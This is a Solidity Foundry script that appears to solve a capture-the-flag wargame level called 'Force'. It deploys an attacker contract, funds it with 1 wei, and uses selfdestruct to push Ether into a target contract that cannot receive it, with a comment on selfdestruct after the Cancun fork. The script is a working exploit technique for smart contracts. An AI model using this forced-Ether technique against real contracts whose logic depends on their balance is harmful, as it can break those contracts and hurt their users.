// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Force.sol";

contract Attacker {
    address payable private receiver = payable(0xb6c2Ec883DaAac76D8922519E63f875c2ec65575);
    function destroyContract() payable external {
        selfdestruct(receiver);
    }
    receive() payable external {}
}

contract ForceScript is Script {

    Force public force = Force(0xb6c2Ec883DaAac76D8922519E63f875c2ec65575);
    /**
     * Solution: selfdestruct (deprecated on) previously erased the contract bytecode from the chain.
     * From the Cancun hard fork selfdestruct only transfers its Ether to the beneficiar. 
     */
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker  attacker = new Attacker();
        console.log("1. Initial balance", address(force).balance);
        (bool success, ) = address(attacker).call{value: 1 wei}("");
        attacker.destroyContract();
        console.log("2. Balance after selfdestruct", address(force).balance);

        vm.stopBroadcast();
    }
}
